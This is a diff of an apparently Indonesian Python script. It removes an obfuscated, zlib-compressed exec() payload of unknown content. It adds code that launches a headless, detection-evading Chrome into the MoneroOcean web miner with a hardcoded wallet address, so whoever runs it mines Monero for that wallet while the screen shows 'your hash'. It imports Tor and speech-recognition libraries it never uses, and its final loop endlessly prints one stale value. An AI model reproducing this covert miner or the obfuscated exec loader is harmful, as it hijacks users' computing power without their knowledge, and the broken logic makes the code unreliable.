@@ -1,5 +1,58 @@
-# Obfuscated with PyObfuscate
-# https://www.github.com/htr-tech
-# Time : Fri Mar  4 13:52:57 2022
-# -------------------------------
-_ = lambda __ : __import__('zlib').decompress(__[::-1]);exec((_)(b"LW\r\xbf\r\xe2\xc7Wk\xf7+\x8fA\xad\x9f\xf8\xa2\xb3\xc1\xa6%\x08i\xfcL>\xedS\xd3\xe5Q\xa0l\x1a\x92<\xe1M\xdb\r\x12\xfc]\x01\x02\xe1!n}sF\x86\xe1iq\x1bt\xddn\x80P3}\xcd\x89\xc61\xda\xa5\x95Z\xd0\xfd}\xa2\x8f\x06G\x08\x9cKH\xc3v\xf5-d\x06|h\xc7w'\x18\x03%\r-x<\xfaN\xf4\x02\xbefEe\x16\x8cZ\xa1\xc3\xa2\xc5\xf8n \xb8\x8a$\xa6aq\xbf\xff?9q*6\x17\xb7\xa0\xd3:C\xb4\xa6\xdbP\x0c\xc0\xde\x06\xe3\xba\\F\x064\n\xe8\xa7=\xd0\x05\x100\x82\x0eA\xcde\x9cx"))
+# ======================== #
+def Logo_Awal():
+    print("""
+# ======================== #
+# ======================== #
+# = Created By Anonymous = #
+# = Welcome Salam Santuy = #
+# ======================== #
+# ======================== #
+    """, flush=True)
+# ======================== #
+Logo_Awal() # Logo Awal
+# ======================== #
+
+# ======================== #
+from stem import Signal
+from datetime import datetime
+from pydub import AudioSegment
+from selenium import webdriver
+from stem.control import Controller
+from selenium.webdriver.common.by import By
+from selenium.webdriver.common.keys import Keys
+from selenium.webdriver.support.ui import Select
+from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.chrome.service import Service
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.common.action_chains import ActionChains
+from selenium.webdriver.support import expected_conditions as EC
+from selenium.common.exceptions import NoSuchElementException, WebDriverException
+# ======================== #
+# pip3 install stem pydub SpeechRecognition selenium requests undetected-chromedriver==1.5.2
+# ======================== #
+import speech_recognition as sr
+import undetected_chromedriver as uc
+import random, urllib, os, sys, time, requests, urllib, pydub, re, json, stem.process
+# ======================== #
+
+# ======================== #
+options = uc.ChromeOptions()
+options.add_argument('--disable-notifications')
+options.add_argument('--headless') # Linux/Windows
+options.add_argument('--no-sandbox') # Linux/Windows
+options.add_argument('--headless=chrome') # Linux/Windows
+#options.add_argument(f'--proxy-server=socks5://127.0.0.1:9050') # Linux/Windows
+options.add_argument('--window-size=1366,768')
+#options.add_extension('./ublock.crx')
+driver = uc.Chrome(options=options)
+# ======================== #
+
+# ======================== #
+driver.get("https://moneroocean.stream/#/dashboard?addr=86QH75AKHx8JALxRj7TkqvfNTvGZmLkUS1V7EosrG3CGPqA4vv7B229KC95aCGTFS4Up3e8maah8Y79t2gqP3NaBL8U32XD&web_miner")
+Loop = False
+hash = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, '/html/body/div[3]/div[4]/div[1]/div[1]/div[3]/div/span'))).text
+Loop = True
+if Loop:
+  while True:
+    print(f"Hash Kamu : {hash}")
+# ======================== #
